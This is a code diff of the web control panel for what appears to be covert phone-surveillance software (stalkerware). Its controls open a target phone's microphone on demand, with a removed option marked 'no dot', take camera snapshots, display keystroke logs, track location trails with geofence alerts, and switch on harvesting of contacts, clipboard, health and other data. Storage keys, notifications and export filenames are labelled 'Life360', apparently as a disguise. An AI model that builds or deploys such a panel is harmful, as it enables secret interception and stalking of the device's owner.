@@ -3,196 +3,446 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
-<meta name="theme-color" content="#0b0f14">
+<meta name="theme-color" content="#0b0f17">
 <title>Monitor</title>
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/leaflet@1.9.3/dist/leaflet.min.css">
 <style>
-  :root { color-scheme: dark; }
-  body { margin:0; background:#0b0f14; color:#e5e7eb; font:15px -apple-system,system-ui,Roboto,sans-serif; padding:14px; }
-  button, select { font-family:inherit; }
-  #map { height:200px; border-radius:12px; margin:12px 0; }
-  #photo { width:100%; border-radius:12px; display:block; background:#131a22; min-height:110px; }
-  #log { font:12px ui-monospace,monospace; background:#131a22; border-radius:12px; padding:10px;
-         max-height:160px; overflow:auto; white-space:pre-wrap; color:#9ca3af; }
-  #toggles { display:grid; grid-template-columns:1fr 1fr; gap:5px; font-size:11.5px; }
-  #toggles label { display:flex; gap:6px; align-items:center; padding:6px; background:#131a22; border-radius:8px; }
-  .card { background:#131a22; border-radius:12px; padding:12px; margin:12px 0; }
+:root { color-scheme: dark; }
+body { margin:0; background:#0b0f17; color:#e5e7eb; font:15px -apple-system,system-ui,Roboto,sans-serif; padding:10px; }
+button { background:#131a22; border:0; color:#e5e7eb; padding:12px; border-radius:10px; width:100%; font-size:15px; }
+input { background:#131a22; color:#e5e7eb; border:0; border-radius:8px; padding:9px; font-size:14px; }
+.row { display:flex; gap:6px; margin:6px 0; }
+.map { width:100%; height:220px; border-radius:12px; margin:10px 0; }
+#photo { width:100%; border-radius:12px; display:block; background:#131a22; min-height:10px; }
+#log { font:12px ui-monospace,monospace; background:#131a22; border-radius:12px; padding:10px; white-space:pre-wrap; max-height:240px; overflow:auto; }
+.clips { display:grid; grid-template-columns:1fr 1fr; gap:6px; font-size:11px; }
+.cliprow { display:flex; gap:6px; align-items:center; padding:6px; background:#131a22; border-radius:8px; }
+.alert { background:#131a22; border-left:3px solid #ef4444; border-radius:8px; padding:8px; margin:4px 0; font-size:13px; }
+h3 { margin:14px 0 6px; font-size:14px; opacity:.75; }
+.top { display:flex; gap:6px; align-items:center; background:#131a22; border-radius:10px; padding:8px; margin:8px 0; }
+.top select { flex:1; padding:8px; border-radius:8px; background:#0b0f17; color:#e5e7eb; border:0; font-size:14px; }
+.top label { display:flex; gap:4px; align-items:center; font-size:12px; white-space:nowrap; }
+.status { font-size:11px; opacity:.6; text-align:right; margin:2px 0; }
+.tgl { display:flex; align-items:center; gap:6px; font-size:12px; padding:3px 0; }
+#where { font-size:13px; background:#131a22; border-radius:10px; padding:10px; margin:8px 0; }
+.pl { display:flex; gap:6px; align-items:center; font-size:12px; background:#131a22; border-radius:8px; padding:7px; margin:3px 0; }
+.pl b { flex:1; font-weight:500; }
+.pl span { opacity:.6; }
+.pl button { width:auto; padding:4px 9px; font-size:12px; }
 </style>
 </head>
 <body>
 
-<button id="unlock" style="width:100%;padding:15px;border:0;border-radius:12px;background:#2563eb;color:#fff;font-size:15px;font-weight:600;">Tap to listen</button>
+<button id="unlock" style="width:100%;padding:15px;border-radius:12px;background:#2563eb;color:#fff;font-size:15px;font-weight:600">Tap to Listen/Unlock</button>
 
-<div style="display:flex;gap:8px;margin:12px 0;">
-  <button id="listen" style="flex:2;padding:14px;border-radius:10px;border:0;background:#2563eb;color:#fff;font-weight:600;">Listen</button>
-  <button id="hold" style="flex:1;padding:14px;border-radius:10px;border:1px solid #1f2937;background:#131a22;color:#e5e7eb;">Hold</button>
+<div class="top">
+<select id="devSel"><option value="*">All devices</option></select>
+<label><input type="checkbox" id="tgt"> target</label>
+</div>
+<div class="status" id="status">connecting</div>
+
+<div class="map" id="map"></div>
+<div id="where">no fix yet</div>
+
+<div id="livebar" style="display:none;align-items:center;gap:10px;background:#131a22;border-radius:10px;padding:10px;margin:10px 0">
+<span id="hb" style="width:10px;height:10px;border-radius:50%;background:#ef4444"></span>
+<div style="flex:1;font-size:13px">Live <span id="timer">0:00</span></div>
+<div id="hi" style="font-size:11px;opacity:.6">headphone</div>
 </div>
 
-<div id="livebar" style="display:none;align-items:center;gap:10px;background:#131a22;border-radius:10px;padding:10px;margin:10px 0;">
-  <span style="width:8px;height:8px;border-radius:50%;background:#ef4444;"></span>
-  <b style="font-size:12px;">LIVE</b>
-  <div style="flex:1;height:6px;background:#0b0f14;border-radius:3px;overflow:hidden;">
-    <div id="lvl" style="height:100%;width:0;background:#16a34a;"></div>
-  </div>
-  <span id="timer" style="font:12px ui-monospace,monospace;color:#9ca3af;">00:00</span>
+<div id="photo"></div>
+
+<div class="row">
+<button id="listen">Listen</button>
+<button id="hold">Hold</button>
+<button id="snap">Snap</button>
+<button id="flip">Flip Cam</button>
 </div>
 
-<select id="micMode" style="width:100%;padding:10px;border-radius:10px;background:#131a22;color:#e5e7eb;border:1px solid #1f2937;">
-  <option value="onDemand">Mic: on demand (no dot)</option>
-  <option value="voiceTrigger">Mic: voice trigger</option>
-  <option value="burst">Mic: burst</option>
-  <option value="always">Mic: always</option>
+<div class="row">
+<span style="flex:1;font-size:13px;align-self:center">Mic mode</span>
+<select id="micMode" style="flex:1;padding:8px;border-radius:8px;background:#131a22;color:#e5e7eb;border:0">
+<option value="voiceTrigger">Voice trigger</option>
+<option value="always">Always on</option>
 </select>
-
-<div id="map"></div>
-<img id="photo" alt="snapshot">
-
-<div style="display:flex;gap:8px;margin:12px 0;">
-  <button id="snap" style="flex:1;padding:12px;border-radius:10px;border:1px solid #1f2937;background:#131a22;color:#e5e7eb;">Snap</button>
-  <button id="flip" style="flex:1;padding:12px;border-radius:10px;border:1px solid #1f2937;background:#131a22;color:#e5e7eb;">Flip cam</button>
 </div>
 
-<div class="card"><b>Alerts</b><div id="alerts" style="font:12px ui-monospace,monospace;max-height:180px;overflow:auto;margin-top:8px;color:#9ca3af;"></div></div>
-<div class="card"><b>Clips</b><div id="clips" style="display:grid;gap:6px;margin-top:8px;"></div></div>
-<div class="card"><b>Features</b><div id="toggles" style="margin-top:8px;"></div></div>
-<div class="card"><b>Keylog</b><div id="log" style="margin-top:8px;"></div></div>
+<div class="row">
+<button id="saveSnap">Save snapshot</button>
+<button id="export">Export history</button>
+<button id="clear">Clear feed</button>
+</div>
 
-<script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.js"></script>
+<h3>Places (geofence)</h3>
+<div id="places"></div>
+<div class="row">
+<input id="placeName" placeholder="name" style="flex:1">
+<input id="placeR" value="200" style="width:64px">
+<button id="addPlace" style="width:auto;white-space:nowrap">Add at last fix</button>
+</div>
+
+<div id="alerts"></div>
+
+<h3>Toggles</h3>
+<div id="toggles"></div>
+
+<h3>Clips</h3>
+<div id="clips"></div>
+
+<h3>Keylog</h3>
+<div id="log"></div>
+
+<script src="https://cdn.jsdelivr.net/npm/leaflet@1.9.3/dist/leaflet.min.js"></script>
 <script>
-const token = new URLSearchParams(location.search).get('token') || '';
-const ws = new WebSocket('ws://' + location.host + '/?role=viewer&token=' + token);
-ws.binaryType = 'arraybuffer';
-const send = (o) => { if (ws.readyState === 1) ws.send(JSON.stringify(o)); };
+var B = window.Android || null;
+var ws = { readyState: 1, send: function (o) { if (B && B.send) B.send(o); } };
+var last = null;
 
-const KEYS = ['mic','camera','location','preciseLocation','keylog','voiceActivity','clipCapture',
-  'liveStream','photoLibrary','contacts','calendar','reminders','clipboard','motion','batteryState',
-  'health','wifiInfo','geofence','screenTime','silentKeepAlive','schedule','storeAndForward',
-  'history','pushAlerts','keywordTriggers','encryption','watchdog','blankSnapshot'];
+function lsGet(k, d) { try { var v = localStorage.getItem(k); return v ? JSON.parse(v) : d; } catch (e) { return d; } }
+function lsSet(k, v) { try { localStorage.setItem(k, JSON.stringify(v)); } catch (e) {} }
 
-const toggles = document.getElementById('toggles');
+var CAP = { alerts: 200, clips: 40, log: 400 };
+var state = {
+alerts: lsGet('l360.alerts', []),
+clips: lsGet('l360.clips', []),
+log: lsGet('l360.log', []),
+devs: lsGet('l360.devs', []),
+sel: lsGet('l360.sel', '*')
+};
+var places = lsGet('l360.places', []);
+var addrcache = lsGet('l360.addr', {});
+
+function send(o) {
+var p = {};
+for (var k in o) p[k] = o[k];
+if (document.getElementById('tgt').checked && state.sel !== '*') p.dev = state.sel;
+ws.send(JSON.stringify(p));
+}
+
+function b64(s) {
+var bin = atob(s);
+var u = new Uint8Array(bin.length);
+for (var i = 0; i < bin.length; i++) u[i] = bin.charCodeAt(i);
+return u;
+}
+function stamp() { return new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19); }
+function hhmm(t) { return new Date(t).toTimeString().slice(0, 8); }
+function pad(n) { return (n < 10 ? '0' : '') + n; }
+function visible(x) { return state.sel === '*' || x.d === state.sel; }
+function setStatus(s) { document.getElementById('status').textContent = s || ''; }
+
+function trim() {
+if (state.alerts.length > CAP.alerts) state.alerts.length = CAP.alerts;
+if (state.clips.length > CAP.clips) state.clips.length = CAP.clips;
+if (state.log.length > CAP.log) state.log.splice(0, state.log.length - CAP.log);
+}
+function persist() { lsSet('l360.alerts', state.alerts); lsSet('l360.clips', state.clips); lsSet('l360.log', state.log); }
+
+function renderAlerts() {
+var box = document.getElementById('alerts');
+box.innerHTML = '';
+state.alerts.filter(visible).slice(0, 40).forEach(function (a) {
+var d = document.createElement('div');
+d.className = 'alert';
+d.textContent = hhmm(a.t) + '  ' + a.text + (a.d ? '  [' + a.d + ']' : '');
+box.appendChild(d);
+});
+}
+function renderLog() {
+document.getElementById('log').textContent = state.log.filter(visible).slice(-250).map(function (l) { return l.text; }).join('\n');
+}
+function renderClips() {
+var box = document.getElementById('clips');
+box.innerHTML = '';
+state.clips.filter(visible).forEach(function (c) {
+var row = document.createElement('div');
+row.className = 'cliprow';
+var src = c.url ? c.url : (c.b64 ? 'data:audio/mp4;base64,' + c.b64 : '');
+var head = document.createElement('div');
+head.style.flex = '1';
+head.innerHTML = '<div>' + hhmm(c.t) + ' ' + c.name + (c.d ? ' [' + c.d + ']' : '') + '</div>' + (src ? '<audio controls preload="none" style="width:100%;height:32px" src="' + src + '"></audio>' : '');
+row.appendChild(head);
+box.appendChild(row);
+});
+}
+function renderPlaces() {
+var box = document.getElementById('places');
+box.innerHTML = '';
+if (places.length === 0) box.innerHTML = '<div class="pl"><b>no places yet</b><span>wait for a fix then add one</span></div>';
+places.forEach(function (p, i) {
+var row = document.createElement('div');
+row.className = 'pl';
+var b = document.createElement('b');
+b.textContent = p.name;
+var s = document.createElement('span');
+s.textContent = p.r + 'm ' + (p.inside ? 'INSIDE' : 'out');
+var x = document.createElement('button');
+x.textContent = 'x';
+x.onclick = function () { places.splice(i, 1); lsSet('l360.places', places); renderPlaces(); };
+row.appendChild(b);
+row.appendChild(s);
+row.appendChild(x);
+box.appendChild(row);
+});
+}
+function renderDevs() {
+var sel = document.getElementById('devSel');
+sel.innerHTML = '<option value="*">All devices</option>';
+state.devs.forEach(function (d) {
+var o = document.createElement('option');
+o.value = d;
+o.textContent = d;
+sel.appendChild(o);
+});
+sel.value = state.sel;
+}
+function addDev(d) {
+if (!d || state.devs.indexOf(d) >= 0) return;
+state.devs.push(d);
+lsSet('l360.devs', state.devs);
+renderDevs();
+}
+function setWhere(text, d) {
+document.getElementById('where').textContent = (d ? d + ': ' : '') + text + '   ' + new Date().toTimeString().slice(0, 5);
+}
+
+function hav(la1, lo1, la2, lo2) {
+var R = 6371000, r = Math.PI / 180;
+var dla = (la2 - la1) * r, dlo = (lo2 - lo1) * r;
+var a = Math.sin(dla / 2) * Math.sin(dla / 2) + Math.cos(la1 * r) * Math.cos(la2 * r) * Math.sin(dlo / 2) * Math.sin(dlo / 2);
+return 2 * R * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
+}
+function fences(lat, lng, d) {
+var flip = false;
+places.forEach(function (p) {
+var inside = hav(lat, lng, p.lat, p.lng) <= p.r;
+if (p.inside === undefined || p.inside === null) { p.inside = inside; flip = true; return; }
+if (inside !== p.inside) {
+p.inside = inside;
+var msg = (d ? d + ' ' : '') + (inside ? 'arrived at ' : 'left ') + p.name;
+addAlert(msg, d);
+if (B && B.notify) { try { B.notify('Life360', msg); } catch (e) {} }
+flip = true;
+}
+});
+if (flip) { lsSet('l360.places', places); renderPlaces(); }
+}
+
+var geolast = 0;
+function geocode(lat, lng, cb) {
+var key = lat.toFixed(4) + ',' + lng.toFixed(4);
+if (addrcache[key]) { cb(addrcache[key]); return; }
+var wait = Math.max(0, 1100 - (Date.now() - geolast));
+setTimeout(function () {
+geolast = Date.now();
+fetch('https://nominatim.openstreetmap.org/reverse?format=jsonv2&zoom=18&addressdetails=1&lat=' + lat + '&lon=' + lng)
+.then(function (r) { return r.json(); })
+.then(function (j) {
+var a = j.display_name || '';
+if (a) { addrcache[key] = a; lsSet('l360.addr', addrcache); cb(a); }
+})
+.catch(function () {});
+}, wait);
+}
+
+var map = L.map('map', { zoomControl: false, attributionControl: false }).setView([0, 0], 2);
+L.tileLayer('https://tile.openstreetmap.org/{z}/{x}/{y}.png', { maxZoom: 19 }).addTo(map);
+var marker = null, trail = null;
+
+var ac = null, playhead = 0, RATE = 16000;
+function playPcm(int16) {
+if (int16.length === 0) return;
+if (ac === null) {
+try { ac = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: RATE }); }
+catch (e) { ac = new (window.AudioContext || window.webkitAudioContext)(); }
+}
+var buf = ac.createBuffer(1, int16.length, ac.sampleRate);
+var f = buf.getChannelData(0);
+for (var i = 0; i < int16.length; i++) f[i] = int16[i] / 32768;
+var src = ac.createBufferSource();
+src.buffer = buf;
+src.connect(ac.destination);
+var t = ac.currentTime;
+if (playhead < t) playhead = t + 0.03;
+src.start(playhead);
+playhead += buf.duration;
+}
+
+var tick = null, t0 = 0;
+function onSession(m) {
+var bar = document.getElementById('livebar');
+bar.style.display = m.on ? 'flex' : 'none';
+document.getElementById('hi').textContent = m.headphone ? 'headphone' : 'speaker';
+document.getElementById('hb').style.background = m.on ? '#ef4444' : '#475569';
+if (m.on) {
+t0 = m.started || Date.now();
+if (tick === null) {
+tick = setInterval(function () {
+var s = Math.floor((Date.now() - t0) / 1000);
+document.getElementById('timer').textContent = Math.floor(s / 60) + ':' + pad(s % 60);
+}, 1000);
+}
+} else if (tick !== null) { clearInterval(tick); tick = null; }
+}
+
+function addAlert(text, d) {
+state.alerts.unshift({ t: Date.now(), text: text, d: d || '' });
+trim(); persist(); renderAlerts();
+}
+function addLog(lines, d) {
+if (!lines) return;
+var arr = Array.isArray(lines) ? lines : String(lines).split('\n');
+for (var i = 0; i < arr.length; i++) state.log.push({ text: arr[i], d: d || '' });
+trim(); persist(); renderLog();
+}
+function addClip(m) {
+state.clips.unshift({ t: Date.now(), name: m.name || 'clip', d: m.dev || '', url: m.url || '', b64: m.b64 || '' });
+trim(); persist(); renderClips();
+}
+function setPhoto(s) {
+if (!s) return;
+window.__shot = s;
+document.getElementById('photo').src = 'data:image/jpeg;base64,' + s;
+}
+
+function handle(m) {
+if (m.dev) addDev(m.dev);
+if (m.type === 'photo') { setPhoto(m.b64); return; }
+if (m.type === 'snapshot') {
+setPhoto(m.photo);
+(m.alerts || []).forEach(function (a) { addAlert((a.title || '') + (a.reason ? ' - ' + a.reason : ''), m.dev); });
+if (m.keys) addLog(m.keys, m.dev);
+return;
+}
+if (m.type === 'keys') { addLog(m.lines, m.dev); return; }
+if (m.type === 'alert') { addAlert((m.title || '') + (m.reason ? ' - ' + m.reason : ''), m.dev); return; }
+if (m.type === 'clip') { addClip(m); return; }
+if (m.type === 'loc') {
+last = { lat: m.lat, lng: m.lng, dev: m.dev || '' };
+var ll = [m.lat, m.lng];
+map.setView(ll, 16);
+if (marker === null) marker = L.circleMarker(ll, { radius: 6, color: '#93c5fd', fillColor: '#93c5fd', fillOpacity: 1, weight: 2 }).addTo(map);
+else marker.setLatLng(ll);
+if (trail === null) trail = L.polyline([ll], { color: '#93c5fd', weight: 3, opacity: .8 }).addTo(map);
+else if (trail.getLatLngs().length > 600) trail.setLatLngs([ll]);
+else trail.addLatLng(ll);
+if (m.addr) setWhere(m.addr, m.dev);
+else geocode(m.lat, m.lng, function (a) { if (a) setWhere(a, m.dev); });
+fences(m.lat, m.lng, m.dev);
+return;
+}
+if (m.type === 'session') {
+onSession(m);
+if (m.on === false && m.msummary) addAlert('Session ended - ' + m.msummary, m.dev);
+return;
+}
+if (m.type === 'settings') {
+if (m.values) {
+document.querySelectorAll('#toggles input').forEach(function (i) {
+if (m.values[i.dataset.k] !== undefined) i.checked = m.values[i.dataset.k] === true;
+});
+}
+if (m.micMode) document.getElementById('micMode').value = m.micMode;
+return;
+}
+if (m.type === 'boot') {
+(m.alerts || []).forEach(function (a) { addAlert((a.title || '') + (a.reason ? ' - ' + a.reason : ''), m.dev); });
+if (m.keys) addLog(m.keys, m.dev);
+}
+}
+
+function onmessage(e) {
+if (typeof e.data !== 'string') { playPcm(new Int16Array(e.data)); return; }
+var m;
+try { m = JSON.parse(e.data); } catch (err) { return; }
+handle(m);
+}
+ws.onmessage = onmessage;
+ws.onclose = function () { setTimeout(function () { location.reload(); }, 2000); };
+
+function onmsg(m) {
+if (typeof m === 'string') { try { m = JSON.parse(m); } catch (e) { return; } }
+if (!m || typeof m !== 'object') return;
+if (m.__bin) { onmessage({ data: b64(m.__bin).buffer }); return; }
+if (m.__hello) { if (m.dev) addDev(m.dev); if (m.devs) m.devs.forEach(addDev); return; }
+if (m.__status) { setStatus(m.state || m.status || ''); return; }
+handle(m);
+}
+function __msg(j) { onmessage({ data: typeof j === 'string' ? j : JSON.stringify(j) }); }
+function __bin(s) { onmessage({ data: b64(s).buffer }); }
+
+var KEYS = ['calls','camera','location','preciseLocation','keylog','voiceActivity','clipCapture','liveStream','photoLibrary','contacts','calendar','reminders','clipboard','motion','batteryState','health','wifiInfo','geofence','screenTime','heartbeat','schedule','storageAndForward','history','pushAlerts','keyboardTrigger','encryption','watching','blankSnapshot'];
+var savedVals = lsGet('l360.toggles', {});
+var toggles = document.getElementById('toggles');
 KEYS.forEach(function (k) {
-  const l = document.createElement('label');
-  l.innerHTML = '<input type="checkbox" data-k="' + k + '"><span>' + k + '</span>';
-  l.querySelector('input').onchange = function (e) {
-    const vals = {}; vals[k] = e.target.checked;
-    send({ type: 'settings', values: vals });
-  };
-  toggles.appendChild(l);
+var l = document.createElement('label');
+l.className = 'tgl';
+var i = document.createElement('input');
+i.type = 'checkbox';
+i.dataset.k = k;
+i.checked = savedVals[k] === true;
+i.onchange = function () {
+var vals = {};
+document.querySelectorAll('#toggles input').forEach(function (x) { vals[x.dataset.k] = x.checked; });
+lsSet('l360.toggles', vals);
+send({ type: 'settings', values: vals });
+};
+l.appendChild(i);
+l.appendChild(document.createTextNode(' ' + k));
+toggles.appendChild(l);
 });
 
-function addAlert(t) {
-  const d = document.createElement('div');
-  d.textContent = new Date().toLocaleTimeString() + '  ' + t;
-  document.getElementById('alerts').prepend(d);
-}
-function addClip(c) {
-  if (document.getElementById('c_' + c.name)) return;
-  const row = document.createElement('div');
-  row.id = 'c_' + c.name;
-  row.innerHTML = '<div style="font-size:11.5px;color:#9ca3af;margin-bottom:4px;">' +
-    new Date(c.at).toLocaleTimeString() + ' - ' + Number(c.seconds).toFixed(0) + 's - ' + c.session + '</div>' +
-    '<audio controls preload="none" style="width:100%;height:32px" src="/clips/' + c.name + '"></audio>';
-  document.getElementById('clips').prepend(row);
-}
-
-const map = L.map('map', { zoomControl: false, attributionControl: false }).setView([0, 0], 2);
-L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png?key=cb1_2nve_1_afe1da6ca18e958f7724fb54').addTo(map);
-let trail = [], dot = null, first = true, poly = null;
-
-let ac = null, rate = 16000, playhead = 0;
-const JITTER = 0.2;
-
-document.getElementById('unlock').onclick = async function () {
-  ac = new AudioContext({ sampleRate: rate });
-  await ac.resume();
-  playhead = ac.currentTime + JITTER;
-  this.textContent = 'Listening';
-  this.style.background = '#16a34a';
-  try { await navigator.wakeLock.request('screen'); } catch (e) {}
+document.getElementById('addPlace').onclick = function () {
+if (!last) { setStatus('no fix yet'); return; }
+var nm = document.getElementById('placeName').value || ('place ' + (places.length + 1));
+var r = parseInt(document.getElementById('placeR').value, 10) || 200;
+places.push({ name: nm, lat: last.lat, lng: last.lng, r: r, inside: null });
+lsSet('l360.places', places);
+document.getElementById('placeName').value = '';
+renderPlaces();
+setStatus('fence saved: ' + nm);
 };
 
-function playPCM(int16) {
-  if (!ac) return;
-  const f = new Float32Array(int16.length);
-  for (let i = 0; i < int16.length; i++) f[i] = int16[i] / 32768;
-  const buf = ac.createBuffer(1, f.length, rate);
-  buf.copyToChannel(f, 0);
-  const src = ac.createBufferSource();
-  src.buffer = buf; src.connect(ac.destination);
-  const now = ac.currentTime;
-  if (playhead < now + 0.02) playhead = now + JITTER;
-  src.start(playhead);
-  playhead += buf.duration;
-}
-
-let holding = false, t0 = null, tick = null;
-
-document.getElementById('listen').onclick = function () {
-  send({ type: 'cmd', cmd: holding ? 'stopListen' : 'listen', seconds: 300 });
+document.getElementById('unlock').onclick = function () {
+if (ac && ac.state === 'suspended') ac.resume();
+document.getElementById('livebar').style.display = 'flex';
+send({ type: 'cmd', cmd: 'unlock' });
 };
+document.getElementById('listen').onclick = function () { send({ type: 'cmd', cmd: 'listen', seconds: 300 }); };
+var holding = false;
 document.getElementById('hold').onclick = function () {
-  holding = !holding;
-  this.textContent = holding ? 'Hold ON' : 'Hold';
-  send({ type: 'cmd', cmd: holding ? 'listen' : 'stopListen', seconds: -1 });
+holding = !holding;
+document.getElementById('hold').textContent = holding ? 'Hold ON' : 'Hold';
+send({ type: 'cmd', cmd: holding ? 'listen' : 'stopListen', seconds: -1 });
 };
 document.getElementById('snap').onclick = function () { send({ type: 'cmd', cmd: 'snap' }); };
 document.getElementById('flip').onclick = function () { send({ type: 'cmd', cmd: 'front' }); };
 document.getElementById('micMode').onchange = function (e) { send({ type: 'settings', micMode: e.target.value }); };
 
-ws.onmessage = function (e) {
-  if (typeof e.data !== 'string') { playPCM(new Int16Array(e.data)); return; }
-  const m = JSON.parse(e.data);
-  if (m.type === 'audio-format') rate = m.rate;
-  if (m.type === 'photo') document.getElementById('photo').src = 'data:image/jpeg;base64,' + m.b64;
-  if (m.type === 'keys') document.getElementById('log').textContent = m.lines.join('\n');
-  if (m.type === 'clip') addClip(m);
-  if (m.type === 'alert') addAlert((m.title || '') + ' - ' + (m.reason || ''));
-  if (m.type === 'vad' && m.state === 'start') addAlert('voice detected');
-  if (m.type === 'vad' && m.state === 'end' && ac) playhead = Math.max(playhead, ac.currentTime + 0.05);
-  if (m.type === 'settings') {
-    document.querySelectorAll('#toggles input').forEach(function (i) {
-      if (m.values && m.values[i.dataset.k] !== undefined) i.checked = m.values[i.dataset.k];
-    });
-    if (m.micMode) document.getElementById('micMode').value = m.micMode;
-  }
-  if (m.type === 'mic') {
-    document.getElementById('livebar').style.display = m.on ? 'flex' : 'none';
-    const lb = document.getElementById('listen');
-    lb.textContent = m.on ? 'Listening...' : 'Listen';
-    lb.style.background = m.on ? '#16a34a' : '#2563eb';
-    clearInterval(tick);
-    if (m.on) {
-      t0 = Date.now();
-      tick = setInterval(function () {
-        const s = Math.floor((Date.now() - t0) / 1000);
-        document.getElementById('timer').textContent =
-          String(Math.floor(s / 60)).padStart(2, '0') + ':' + String(s % 60).padStart(2, '0');
-      }, 1000);
-    }
-    if (!m.on && m.summary) addAlert('session ended - ' + m.summary);
-  }
-  if (m.type === 'gps') {
-    const p = [m.lat, m.lon];
-    trail.push(p);
-    if (first) { map.setView(p, 16); first = false; } else { map.panTo(p); }
-    if (dot) { dot.setLatLng(p); } else {
-      dot = L.circleMarker(p, { radius: 7, color: '#4ade80', fillColor: '#4ade80', fillOpacity: 1, weight: 2 }).addTo(map);
-    }
-    if (trail.length > 1) {
-      if (poly) { poly.setLatLngs(trail); } else { poly = L.polyline(trail, { color: '#3b82f6', weight: 3 }).addTo(map); }
-    }
-  }
-  if (m.type === 'snapshot') {
-    if (m.photo) document.getElementById('photo').src = 'data:image/jpeg;base64,' + m.photo;
-    if (m.gps) { map.setView([m.gps.lat, m.gps.lon], 16); first = false; }
-    (m.clips || []).forEach(addClip);
-    (m.alerts || []).forEach(function (a) { addAlert((a.title || '') + ' - ' + (a.reason || '')); });
-    if (m.keys) document.getElementById('log').textContent = m.keys.join('\n');
-  }
+document.getElementById('devSel').onchange = function (e) {
+state.sel = e.target.value;
+lsSet('l360.sel', state.sel);
+renderAlerts(); renderLog(); renderClips();
+};
+document.getElementById('export').onclick = function () {
+var name = 'life360-history-' + stamp() + '.json';
+var text = JSON.stringify({ exported: new Date().toISOString(), devices: state.devs, places: places, alerts: state.alerts, clips: state.clips.map(function (c) { return { t: c.t, name: c.name, d: c.d, url: c.url }; }), log: state.log }, null, 1);
+if (B && B.save) { B.save(name, text); setStatus('saved ' + name); }
+else { var a = document.createElement('a'); a.href = 'data:application/json;base64,' + btoa(text); a.download = name; a.click(); }
+};
+document.getElementById('saveSnap').onclick = function () {
+if (!window.__shot) { setStatus('no snapshot yet'); return; }
+var name = 'life360-snap-' + stamp() + '.jpg';
+if (B && B.saveB64) { B.saveB64(name, window.__shot); setStatus('saved ' + name); }
+else { var a = document.createElement('a'); a.href = 'data:image/jpeg;base64,' + window.__shot; a.download = name; a.click(); }
+};
+document.getElementById('clear').onclick = function () {
+state.alerts = []; state.clips = []; state.log = [];
+persist(); renderAlerts(); renderLog(); renderClips();
 };
 
-ws.onclose = function () { setTimeout(function () { location.reload(); }, 2000); };
-setTimeout(function () { map.invalidateSize(); }, 150);
+renderDevs(); renderAlerts(); renderLog(); renderClips(); renderPlaces();
+setTimeout(function () { map.invalidateSize(); }, 200);
 </script>
 </body>
 </html>
